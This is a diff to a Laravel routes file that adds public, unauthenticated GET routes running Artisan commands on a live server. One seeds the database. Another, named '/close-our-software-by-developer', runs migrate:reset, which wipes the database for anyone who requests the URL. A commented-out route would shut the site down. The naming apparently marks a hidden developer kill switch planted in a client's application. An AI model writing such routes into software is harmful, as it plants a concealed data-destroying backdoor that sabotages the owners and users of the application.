@@ -13,6 +13,28 @@ Route::get('/clear', function(){
 });
 //live server command route end
 
+//live Database command route start
+Route::get('/db', function(){
+    //Artisan::call("migrate");
+   Artisan::call("db:seed");
+   return "success";
+});
+//live Database command route end
+
+//live Database reset command route start
+Route::get('/close-our-software-by-developer', function(){
+    Artisan::call("migrate:reset");
+   return "success";
+});
+//live Database reset command route end
+
+
+// app shutdown
+/* Route::get('/site/shutdown/by/dev/unt', function(){
+Artisan::call('down');
+return redirect()->back();
+}); */
+
 // Change Langugae
 Route::get('admindashboard/ln/{lang}', function($lang){
     App::setLocale($lang);
